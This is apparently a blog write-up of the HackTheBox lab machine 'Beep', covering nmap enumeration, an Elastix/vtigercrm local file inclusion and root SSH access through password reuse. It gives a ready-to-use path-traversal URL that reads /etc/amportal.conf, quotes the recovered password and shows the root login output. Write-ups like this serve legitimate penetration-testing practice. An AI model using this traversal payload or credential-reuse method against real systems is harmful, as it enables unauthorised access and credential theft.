---
layout: post
title:  "HackTheBox - Beep Writeup"
categories: HackTheBox
tags: [pentesting]
draft: false
---

# Introduction

This is a writeup for the machine "Beep" (10.10.10.7) on the platform HackTheBox. HackTheBox is a penetration testing labs platform so aspiring pen-testers & pen-testers can practice their hacking skills in a variety of different scenarios.

## Enumeration

### NMAP

As always we start off with our full TCP port scan using NMAP - this box is running quite a lot of services **but** don't let that scare you! We follow the same enumeration process so let's not worry that its any different just because there are more ports!

```
Nmap scan report for 10.10.10.7
Host is up (0.090s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: STLS AUTH-RESP-CODE UIDL RESP-CODES IMPLEMENTATION(Cyrus POP3 server v2) PIPELINING APOP USER TOP EXPIRE(NEVER) LOGIN-DELAY(0)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            742/udp  status
|_  100024  1            745/tcp  status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: LITERAL+ CATENATE MAILBOX-REFERRALS MULTIAPPEND SORT=MODSEQ URLAUTHA0001 QUOTA X-NETSCAPE ATOMIC CONDSTORE UNSELECT LISTEXT STARTTLS RENAME THREAD=ORDEREDSUBJECT UIDPLUS LIST-SUBSCRIBED ANNOTATEMORE NO THREAD=REFERENCES NAMESPACE ACL OK SORT IMAP4 ID RIGHTS=kxte Completed CHILDREN BINARY IDLE IMAP4rev1
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2019-06-12T19:52:21+00:00; -1h22m20s from scanner time.
745/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql?
|_mysql-info: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: mean: -1h22m20s, deviation: 0s, median: -1h22m20s
```

As you can see there are a bunch of different things running but that's not a problem! Let's first browse to the box on port 80 and see what we can find, in the background we'll run a directory scan on port 80 & 443 like usual.

### HTTP

Upon browsing to the box on port 80 I could see they were using something called "Elastix", the same software was running on port 443 so I cancelled my port 443 directory scanning and left the port 80 scan running.

![Elastix Login](/../../assets/images/2019-06-12-Beep/Elastix.png)

I decided to search for some exploits for "Elastix" despite not having a software version just because its a quick thing to do and one the easier boxes such as this one it never hurts to do a quick search as usually the exploitation process is very simple! Funnily enough when I searched this, the first thing that came up was an LFI & the second thing that appeared was an RCE - both work however I used the LFI in my initial run through so that's what I'll explain here.

## Exploitation

In order to exploit the LFI, all we had to do was browse to the following address `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`. When browsing to the location you can see there are lots of usernames & passwords everywhere, interesting! I used `CTRL+F` to search for `password` and then I skipped through the file until I noticed this `jEhdIekWmdjE` a few times. With this being an easier box I decided to try & SSH with this address, perhaps they're password re-using, turns out there were!

```
root@KaliAttacker:~/Documents/HTB/Retired/Beep# ssh 10.10.10.7
The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
root@10.10.10.7's password: 
Last login: Mon Jun 10 14:28:47 2019 from 10.10.14.5

Welcome to Elastix 
----------------------------------------------------
```

Well, that was easy! If you do an `id` you can see we're running as root so no need for privilege escalation, just grab the `user.txt` and `root.txt` and you're done. Beep actually HAS a lot of exploitation methods so if you find yourself with extra time & you're preparing for the OSCP, it might be worth exploiting this one in a variety of ways because there's lots of paths!


